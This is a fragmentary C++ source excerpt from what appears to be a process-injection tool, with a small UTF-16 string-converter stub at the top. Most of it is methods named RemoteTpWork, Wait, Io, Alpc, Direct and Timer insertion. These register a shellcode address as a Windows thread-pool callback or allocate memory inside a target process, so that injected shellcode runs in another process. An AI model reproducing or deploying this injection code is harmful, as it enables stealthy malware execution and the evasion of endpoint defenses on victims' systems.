...
// MinGW's libstdc++ no longer provides std::wstring_convert / std::codecvt_utf8_utf16
// in C++20 mode, so use a minimal stand-in with the same to_bytes() interface used
// by the debug logging below (the original global provides only to_bytes()).
struct _WideStringConverter
{
	std::string to_bytes(const wchar_t* ws) const
	{
		std::string out;
		for (; ws && *ws; ++ws)
		{
			unsigned int wc = (unsigned int)(unsigned short)*ws;
			if (wc <= 0x7F)
...
void RemoteTpWorkInsertion::SetupExecution() const
{
	...
	const auto pTpWork = w_CreateThreadpoolWork(reinterpret_cast<PTP_WORK_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
...
{
	const auto pTpWait = w_CreateThreadpoolWait(reinterpret_cast<PTP_WAIT_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	...
	const auto pRemoteTpDirect = reinterpret_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
...
void RemoteTpIoInsertion::SetupExecution() const
{
	...
	const auto pTpIo = w_CreateThreadpoolIo(*p_hFile, reinterpret_cast<PTP_WIN32_IO_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
...
void RemoteTpAlpcInsertion::SetupExecution() const
{
	...
	const auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, reinterpret_cast<PTP_ALPC_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
...
void RemoteTpDirectInsertion::SetupExecution() const
{
	...
	const auto RemoteDirectAddress = reinterpret_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
...
void RemoteTpTimerInsertion::SetupExecution() const
{
	...
	const auto pTpTimer = w_CreateThreadpoolTimer(reinterpret_cast<PTP_TIMER_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
